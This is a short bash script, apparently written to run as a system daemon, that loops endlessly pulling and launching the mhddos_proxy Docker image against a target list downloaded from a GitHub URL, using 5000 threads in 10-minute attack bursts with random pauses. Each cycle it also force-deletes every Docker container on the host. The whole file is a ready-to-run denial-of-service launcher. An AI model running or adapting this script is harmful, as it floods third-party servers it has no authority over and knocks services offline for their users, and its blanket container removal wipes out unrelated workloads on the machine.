#!/bin/bash
#Prepared script for use as a system deamon in unix-based systems for automated 

duration="10m"
threads_count="-t 5000"
targets_source="-c https://raw.githubusercontent.com/uawarrior/project1/main/trgts0.txt"
more_params="--table --http-methods GET STRESS"

echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Start: Removing any existing docker containers"
sudo docker rm -f $(sudo docker ps -a -q)

while [ 1 == 1 ]
do
	echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running: Updating the docker image and starting the execution for $duration"
	sudo docker pull ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest
	terminal -e "sudo docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest $targets_source $threads_count $more_params"
	sleep $duration

	echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running: Removing the container"
	sudo docker rm -f $(sudo docker ps -a -q)
	chill_delay="$(shuf -i 3-8 -n 1)m"
	echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Pause: Chilling for $chill_delay"
	sleep $chill_delay
done